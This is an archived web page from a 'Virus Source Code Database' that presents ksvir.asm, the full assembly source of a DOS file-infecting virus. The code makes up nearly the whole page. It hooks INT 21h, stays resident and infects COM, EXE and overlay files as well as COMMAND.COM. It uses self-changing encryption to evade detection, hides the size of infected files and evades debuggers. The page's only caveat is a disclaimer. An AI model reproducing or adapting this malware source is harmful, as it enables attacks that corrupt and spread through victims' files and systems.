<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ksvir_asm</title>
<meta name="KEYWORDS" content="ksvir.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ksvir.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


;                WARNING
;                -------
; This virus for research purposes only.
; There is probably bugs galore in this
; code.  You have been warned so that I
; cannot be held accountable for any stupid
; thing you might do with it.
;
; ie: Leave it alone, Rob!  @-)

        .model   tiny
        .code

         org     0
                                                                           
KS_virus:
         mov     bx,offset KS_begin

encrypt:
         mov     cx,offset first_4-offset KS_begin
         mov     al,0
key      equ     $-1

enc_loop:
         add     byte ptr cs:[bx],al

crypter:
         nop                                 ;code decrypter
         nop                                 ; always changes!!
         inc     bx                          ;get next byte
         loop    enc_loop
                                                                           
KS_begin:
         sub     bx,offset first_4           ;bx=virus relative offset
         xchg    ax,cx                       ;ax=0
         dec     ax                          ;ax=0FFFFh -> installation check
         int     21h
         or      al,ah                       ;are al and ah the same?
         je      exit_virus                  ;if yes, assume we are there
         push    ds                          ;store DS
         xor     di,di                       ;zero di
         mov     ds,di                       ;beginning of INT table segment
         lds     ax,dword ptr ds:21h*4         ;get INT 21h offset
         mov     word ptr cs:int21_ofs[bx],ax  ;store it
         mov     Word ptr cs:int21_seg[bx],ds  ;and the segment
         mov     cx,es                         ;cx=PSP segment
         dec     cx                          ;sub 1 to get MCB
         mov     ds,cx                       ;ds=MCB
         sub     word ptr [di+3],0C0h
         mov     ax,word ptr [di+12h]        ;get high memory segment
         sub     ax,0C0h                     ;give us room in memory
         mov     word ptr [di+12h],ax        ;save it
         mov     es,ax                       ;top of memory
         sub     ax,1000h                    ;reserve it for us
         mov     word ptr cs:XAX[bx],ax      ;here we are!
         push    cs
         pop     ds                          ;ds=cs
         mov     si,bx                       ;si=0 if EXE
         mov     cx,offset first_4           ;bytes to move
         cld                                 ;inc si,di
         repz    movsb                       ;copy virus into memory
         mov     ds,cx                       ;ds=0

         cli                                        ;turn interrupts off
         mov     word ptr ds:[21h*4],offset New_21  ;point to int 21 offset
         mov     word ptr ds:[21h*4]+2,es           ;point to int 21 segment
         sti                                        ;turn interrupts back on

         mov     ax,4BFFh                    ;infect COMMAND.COM
         push    bx                          ;keep bx
         int     21h
         pop     bx
         pop     ds
         push    ds
         pop     es
                                                                           
exit_virus:
         lea     si,word ptr first_4[bx]     ;point to stored 1st 4 bytes
         mov     di,100h                     ;di=beginning of host
         cmp     bx,di                       ;host starts at 0100h?
         jb      exit_EXE                    ;if not, exit for EXE
         push    di                          ;push 100h on stack for RET
         movsw                               ;restore first 4 bytes in host
         movsw
         ret
                                                                           
exit_EXE:
         mov     ax,es                       ;ax=PSP segment
         add     ax,10h
         add     word ptr cs:[si+2],ax       ;reallocate entry segment
         add     word ptr cs:[si+4],ax
         cli                                 ;turn interrupts off
         mov     sp,word ptr cs:[si+6]       ;restore stack ptr
         mov     ss,word ptr cs:[si+4]       ;restore stack seg
         sti                                 ;turn interrupts back on
         jmp     dword ptr cs:[si]           ;run host program segment

; Fake INT 21h:

install_check:
         push    bp                          ;save bp (if it's the virus,
         mov     bp,sp                       ;it will be the rel offset)
         push    ds                          ;store registers
         push    bx
         lds     bx,dword ptr [bp+2]
         cmp     word ptr [bx],0C40Ah  ;XX   ;is it the virus checking in?
         pop     bx                          ;restore registers
         pop     ds                          ;if wasn't us:
         pop     bp                          ;restore relative offset
         jne     call_DOS                    ;and let DOS do interrupt
         inc     ax                          ;AX=0 if install check
         iret                                ;and RET

New_21:
         cmp     ax,0FFFFh                   ;installation check
         je      install_check               ;respond to ID call
         cmp     ah,4Bh                      ;execute program?
         je      exec_prog
         cmp     ah,11h                      ;find first?
         je      find_file
         cmp     ah,12h                      ;find next?
         je      find_file
         cmp     ax,3D00h                    ;open a file?
         jne     call_DOS                    ;otherwise, let DOS process INT
         call    infect_file

call_DOS:
         db       0EAh

int21_ofs dw     'SK'
int21_seg dw     'SK'

find_file:
         push    bp                          ;save argument ptr
         mov     bp,sp                       ;look on stack
         cmp     word ptr [bp+4],'SK'        ;it's us?
XAX      equ     $-2
         pop     bp                          ;restore arg pointer
         jb      call_DOS                    ;we're haven't hooked yet
         call    Int_21h
         push    ax
         push    bx
         push    dx
         push    es
         mov     ah,2Fh                      ;get DTA
         call    Int_21h
         cmp     byte ptr es:[bx],0FFh       ;is this an extended FCB?
         je      Not_Extended_FCB            ;jump if it's not, otherwise
         sub     bx,7                        ;convert to normal FCB

Not_Extended_FCB:
         mov     al,byte ptr es:[bx+1Eh]     ;minutes of last write 
         and     al,1Fh                      ;mask out seconds
         cmp     al,1Fh                      ;62 seconds?
         jne     exit_find                   ;exit, it's infected
         mov     dx,word ptr es:[bx+26h]     ;get file size
         mov     ax,word ptr es:[bx+24h]     ;get file size
         sub     ax,offset virus_end         ;sub virus size
         JA      OVERFLOWED
         DEC     DX

OVERFLOWED:
         or      dx,dx                       ;check time stamp
         jl      exit_find                   ;leave if time already altered
         mov     word ptr es:[bx+26h],dx     ;fix file size in dir
         mov     word ptr es:[bx+24h],ax     ;to uninfected size

exit_find:
         pop     es
         pop     dx
         pop     bx
         pop     ax
         iret                                ;return to caller
                                                                           
                                                                           
exec_prog:
         cmp     al,1                        ;load but don't execute?
         je      debugging                   ;it's probably being debugged!
         cmp     al,0FFh                     ;this is ours to get COMMAND.COM
         je      COMSPEC                     ;infect COMMAND.COM
         call    infect_it                   ;infect whatever it was...
         jmp     short call_DOS              ;now do real interrupt

inf_CCOM:
         push    dx
         push    ds
         mov     dx,offset COMMANDCOM        ;get ready to infect COMMAND
         push    cs
         pop     ds
         mov     byte ptr Do_CCOM,0FFh       ;set the flag so we remember
         call    infect_it                   ; what we're doing
         pop     ds
         pop     dx
         iret

COMSPEC:
         mov     ah,51h                      ;get PSP address
         call    int_21h
         mov     es,bx                       ;es=psp of current process
         mov     ds,word ptr es:2Ch          ;program owning environment
         xor     si,si                       ;si=0
         push    cs
         pop     es                          ;es=cs

Inf_COMSPEC:
         mov     di,offset COMSPECequ        ;COMSPEC=XXX
         mov     cx,4                        ;compare first 4 bytes
         rep     cmpsw
         jcxz    fukt_env                    ;somethin' weird happened

COMSPEC_end:
         lodsb                               ;get a byte of COMSPEC bytes
         or      al,al
         jnz     COMSPEC_end                 ;still not zero? get another
         cmp     byte ptr [si],0             ;found the end yet?
         jne     Inf_COMSPEC                 ;no, do more
         jmp     short inf_CCOM              ;yes, infect it!

fukt_env:
         mov     dx,si                       ;get COMMAND.COM anyway
         mov     byte ptr cs:Do_CCOM,0FFh    ;set flag so we don't forget
         call    infect_it                   ; what we're doing
         iret

; Watch this trick!

debugging:
         push    es                          ;save registers to return here
         push    bx                          ; instead
         call    Int_21h                     ;do DOS interrupt
         pop     bx                          ;orig caller
         pop     es
         jb      bomb_out                    ;error
         xor     cx,cx                       ;clear cx
         lds     si,dword ptr es:[bx+12h]    ;get entry point on ret
         push    ds
         push    si
         mov     di,100h                     ;di=start of potential victim
         cmp     si,di                       ;COM flle?
         jl      load_exe                    ;EXE?
         ja      prep_2_bomb                 ;get out
         lodsb                               ;load first byte
         cmp     al,0E9h                     ;is it a JMP?
         jne     prep_2_bomb                 ;no, then get out
         lodsw                               ;load JMP destination
         push    ax                          ;save it
         lodsb                               ;load 4th byte
         cmp     al,'O'                      ;is it our marker
         pop     si                          ;jmp destination into si
         jne     prep_2_bomb                 ;error?
         add     si,103h                     ;convert to file offset
         inc     cx
         inc     cx                          ;add 2 to cx
         pop     ax                          ;restore ax
         push    si                          ;save virus offset
         push    ds
         pop     es                          ;ds=es
         jmp     short hide_in_debug

load_exe:
         lea     di,word ptr [bx+0Eh]         ;check stack
         cmp     word ptr es:[di],offset Virus_End+512-2 ;infected?
         jne     prep_2_bomb

hide_in_debug:
         lodsb                               ;
         cmp     al,0BBh
         jne     prep_2_bomb
         lodsw                               ;get starting offset
         push    ax                          ;and save for decrypt
         lodsw
         cmp     ax,word ptr cs:encrypt
         pop     si                          ;
         jne     prep_2_bomb                 ;error
         add     si,offset first_4-(offset KS_begin)  ;encrypted len
         jcxz    disinf_exe
         repz    movsw                       ;move 'em ba k
         jmp     short cont_disinf

disinf_exe:
         mov     ah,51h                      ;get PSP address
         call    Int_21h
         add     bx,10h                      ;go to starting CS
         mov     ax,word ptr [si+6]          ;get stack pointer
         dec     ax
         dec     ax                          ;shrink by 2
         stosw
         mov     ax,word ptr [si+4]          ;get stack segment
         add     ax,bx                       ;adjust
         stosw
         movsw
         lodsw
         add     ax,bx
         stosw

cont_disinf:
         pop     di
         pop     es
         xchg    ax,cx
         mov     cx,offset Virus_End         ;virus length
         repz    stosb                       ;Virus is hidden!!
         jmp     short clear_error

prep_2_bomb:
         pop     ax
         pop     ax                          ;clear the stack of our data

clear_error:
         xor     ax,ax                       ;emulate NO_ERROR
         clc

bomb_out:
         retf    2

infect_file:
         push    si                          ;save registers
         push    di
         push    ds
         push    es
         push    cx
         push    ax
         mov     si,dx                       ;si=victim's name

extension:
         lodsb                               ;scan filename for extension
         or      al,al                       ;look at al
         jz      no_ext
         cmp     al, '.'
         jne     extension
         mov     di,offset ext_table-3       ;look at extension table
         push    cs
         pop     es                          ;es=cs
         mov     cx,3                        ;next extension in table
         NOP     ;XX DEBUG ONLY XX;

next_ext:
         push    cx                          ;present extension in table
         push    si
         mov     cx,3
         add     di,cx                       ;point to next ext in table
         push    di

look_ext:
         lodsb                               ;get first byte of extension
         and     al,5Fh
         cmp     al,byte ptr es:[di]         ;same?
         jne     wrong_ext                   ;wrong extension. try another
         inc     di                          ;next char in extension
         loop    look_ext                    ;get it
         call    infect_it
         add     sp,6
         jmp     short no_ext

wrong_ext:
         pop     di
         pop     si
         pop     cx
         loop    next_ext                    ;try next extension

no_ext:
         pop     ax
         pop     cx
         pop     es
         pop     ds
         pop     di
         pop     si
         ret
                                                                           
infect_it:
         pushf
         push    ax
         push    bx
         push    cx
         push    si
         push    di
         push    es
         push    ds
         push    dx
         mov     ax,4300h                    ;get file attributes
         call    Int_21h
         jb      cant_inf
         push    cx                          ;store attribs on stack
         and     cl,1                        ;mask read only bit
         cmp     cl,1                        ;read only file?
         pop     cx                          ;get attrib info again
         jne     open_4_write                ;continue if not read-only
         and     cl,0FEh                     ;otherwise, enable write
         mov     ax,4301h
         call    Int_21h

open_4_write:
         mov     ax,3D02h                    ;open file for r/w
         call    Int_21h
         jnb     process_timestamp

cant_inf:
         jmp     cant_infect

process_timestamp:
         xchg    ax,bx                       ;put file handler into bx
         push    cs
         push    cs
         pop     ds
         pop     es                          ;es=ds=cs
         mov     ax,5700h                    ;get file Date and Time
         call    Int_21h
         push    dx                          ;save date
         push    cx                          ;save time
         and     cl,1Fh                      ;mask out seconds
         cmp     cl,1Fh                      ;is time at 62 seconds?
         je      inf_error                   ;jump if it is
         mov     dx,offset data_buf          ;buffer for data
         mov     cx,offset Buffer_End-offset data_buf
         mov     ah,3Fh                      ;read from file
         call    Int_21h                     ;bx=file handle
         jnb     read_ok

inf_error:
         stc                                 ;set carry for error
         jmp     inf_close

read_ok:
         cmp     ax,cx                       ;read in 1Ch bytes?
         jne     inf_error                   ;exit if error reading
         xor     dx,dx                       ;zero dx
         mov     cx,dx                       ;ofs 0<orig of new file pos
         mov     ax,4202h                    ;set pointer to end of file
         call    Int_21h
         or      dx,dx
         jne     file_type                       ;check it out...
         cmp     ax,offset Virus_End+512         ;code too small?
         jb      inf_error

file_type:
         cmp     word ptr Disk_ID,'ZM'       ;EXE header?
         je      EXE_header                  ;jump if yes, COM if no...
                                                                           
         cmp     byte ptr Disk_ID+3,'O'      ;is 4th byte from begin a 'O'?
         je      inf_error                   ;get out if it is
         cmp     byte ptr Do_CCOM,0          ;are we infecting COMMAND.COM?
         je      COM_start
         sub     ax,offset Virus_End         ;infect slack of COMMAND.COM
         xchg    ax,dx
         xor     cx,cx
         mov     ax,4200h                    ;pos'n pointer to infectable spc
         call    Int_21h

COM_start:
         mov     si,offset Disk_ID           ;si=beginning of victim
         mov     di,offset first_4           ;di=our storage space
         movsw                               ;store 1st bytes in our place
         movsw
         sub     ax,3                        ;sub 3 for jmp statement
         mov     byte ptr Disk_ID,0E9h       ;add the jmp statement
         mov     word ptr Disk_ID+1,ax       ;add the destination
         mov     byte ptr Disk_ID+3,'O'      ;add the marker
         add     ax, (offset KS_begin)+0103H
         jmp     short cont_inf

EXE_header:
         cmp     word ptr Stack_SP,offset Virus_End+512        ;infected?
         je      inf_error                   ;if so, exit
         cmp     word ptr Overlays,0         ;is it an overlay?
         jne     inf_error                   ;if not main prog, leave
         push    dx
         push    ax
         mov     cl,4
         ror     dx,cl
         shr     ax,cl                       ;convert to paragraphs
         add     ax,dx                       ;ax:dx=filesize
         sub     ax,word ptr Header_Size     ;subtract header size
         mov     si,offset Start_IP
         mov     di,offset first_4           ;original CS:IP
         movsw
         movsw
         mov     si,offset stack_ss          ;save stack
         movsw                               ;ax:dx=filesize
         movsw
         mov     word ptr start_cs,ax        ;set init CS
         mov     word ptr stack_ss,ax        ;and stack
         mov     word ptr stack_sp,offset Virus_End+512  ;virus + stack size
         pop     ax
         pop     dx
         push    ax
         add     ax, offset Virus_End+512    ;virus + stack size
         jnb     no_carry
         inc     dx

no_carry:
         mov     cx,512                      ;take image size
         div     cx
         mov     word ptr File_Size,ax       ;image size /512
         mov     word ptr Last_Page,dx       ;imaze size MOD 512
         pop     ax
         and     ax,0Fh
         mov     word ptr Start_IP,ax        ;set initial ip
         add     ax,(offset KS_begin)

cont_inf:
         mov     word ptr ds:KS_virus+1,ax
         push    ds                          ;
         xor     si,si
         mov     ds,si
         mov     ax,word ptr ds:[46Ch]       ;slowest word of timer count
         pop     ds                          ; (thanx STONED!!!)
         push    bx
         mov     byte ptr ds:key,ah          ;change encrypt value
         and     ax,0Fh
         xchg    ax,bx
         shl     bx,1
         mov     ax,word ptr new_crypt[bx]   ;get encryption method
         mov     word ptr ds:crypter,ax      ;store it
         mov     di,offset Buffer_End
         mov     cx,offset Virus_End
         push    cx
         cld
         repz    movsb
         mov     bx, (offset KS_begin)
         push    [bx]
         mov     byte ptr [bx],0C3h
         push    bx
         xor     byte ptr ds:(([bx+enc_loop+1])-(offset KS_begin)),28h ;[BX-7]
         add     bx, offset Buffer_End         ;change to opposite encrypter
         call    encrypt
         pop     bx
         pop     [bx]
         mov     dx,offset Buffer_End
         pop     cx
         pop     bx
         mov     ah,40h                      ;write enrypted virus
         call    Int_21h
         jc      inf_close
         xor     dx,dx
         mov     cx,dx
         mov     ax,4200h                    ;set ptr loc
         call    Int_21h
         jb      inf_close
         mov     dx,offset data_buf
         mov     cx,offset Buffer_End-offset data_buf ;write this
         mov     ah,40h                      ;the new header to the file
         call    Int_21h

inf_close:
         pop     cx
         pop     dx
         jb      close_file
         cmp     byte ptr Do_CCOM,0FFh       ;infecting COMMAND.COM?
         je      close_file
         or      cl,1Fh                      ;set timestamp to 62 secs?

close_file:
         mov     ax,5701h                    ;restore fle date and time
         call    Int_21h
         mov     ah,3eh
         call    Int_21h

cant_infect:
         mov     byte ptr cs:Do_CCOM,0
         pop     dx
         pop     ds
         pop     es
         pop     di
         pop     si
         pop     cx
         pop     bx
         pop     ax
         popf
         ret
                                                                           
Int_21h:
         pushf                               ;push flags to simulate
         call     dword ptr cs:int21_ofs     ;an interrupt
         ret

new_crypt:                                   ;Method Value:
         inc     al                          ;              0
         dec     al                          ;              1
         inc     ax                          ;              2
         inc     ax                          ;
         dec     ax                          ;              3
         dec     ax                          ;
         add     al,cl                       ;              4
         sub     al,cl                       ;              5
         xor     al,cl                       ;              6
         xor     al,ch                       ;              7
         not     al                          ;              8
         neg     al                          ;              9
         ror     al,1                        ;              A
         rol     al,1                        ;              B
         ror     al,cl                       ;              C
         rol     al,cl                       ;              D
         nop                                 ;              E
         nop                                 ;
         add     al,ch                       ;              F
                                                                           

COMSPECequ    db    'COMSPEC='

COMMANDCOM    db    '\COMMAND.COM',0

ext_table     db    'COMEXEOVL'

first_4       dw    0,0FFF0h

origstack     dw    0,0FFFFh
                                                                           
Virus_End:
              org   415h  ;;

Do_CCOM       db    ?
              org  41Ah   ;;

data_buf:
Disk_ID       dw    ?
Last_Page     dw    ?
File_Size     dw    ?
Relocs        dw    ? ;;
Header_Size   dw    ?
Min_Alloc     dw    ? ;;
Max_Alloc     dw    ? ;;
Stack_SS      dw    ? ;;
Stack_SP      dw    ?
CheckSum      dw    ?
Start_IP      dw    ?
Start_CS      dw    ? ;;
Reloc_Ofs     dw    ? ;;
Overlays      dw    ?
Buffer_End:

        End   KS_Virus

</textarea></td></tr></table></body></html>
